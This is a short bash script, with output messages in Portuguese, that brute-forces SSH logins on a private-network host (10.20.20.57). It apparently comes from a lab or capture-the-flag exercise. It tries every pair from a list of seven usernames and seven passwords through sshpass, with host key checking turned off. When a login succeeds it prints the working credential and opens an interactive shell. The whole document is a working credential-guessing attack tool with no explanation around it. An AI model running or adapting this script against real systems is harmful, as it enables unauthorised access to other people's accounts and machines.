#!/bin/bash

TARGET="10.20.20.57"

USERS=("jonasf" "nickj" "joshuaa" "joaos" "leonardz" "anneh" "dmitrip")
PASSWORDS=(
"minecraft123"
"ZeqlcR2!4gN"
"QW5al7oPN2-1"
"F147-0356agipV"
"averylongpasswordfornohackertodiscover"
"VSZ785-aWB15#q"
"42W#wskb-62wA$sc"
)

echo "[+] Iniciando brute force em $TARGET..."

for user in "${USERS[@]}"; do
  for pass in "${PASSWORDS[@]}"; do
    echo "[*] Testando $user:$pass"
    
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $user@$TARGET "whoami" 2>/dev/null

    if [ $? -eq 0 ]; then
      echo "[+] CREDENCIAL VÁLIDA: $user:$pass"
      echo "[+] Conectando..."
      sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@$TARGET
      exit 0
    fi
  done
done

echo "[-] Nenhuma credencial funcionou."
